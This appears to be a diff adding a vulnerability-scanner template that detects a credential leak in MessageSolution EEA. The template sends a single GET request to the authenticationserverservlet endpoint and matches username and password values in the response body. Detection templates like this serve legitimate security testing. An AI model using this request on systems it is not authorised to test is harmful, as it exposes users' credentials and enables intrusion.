@@ -1,0 +1,25 @@
+id: yaml-poc-messagesolution-eea-leak-CT-158957
+info:
+  name: MessageSolution EEA Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects an information leak in MessageSolution EEA exposing sensitive information such as usernames and passwords.
+    The issue is identified by parsing sensitive data in the response body from a specific endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/authenticationserverservlet"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<username>(.*?)</username>"
+      - type: regex
+        part: body
+        regex:
+          - "<password>(.*?)</password>"
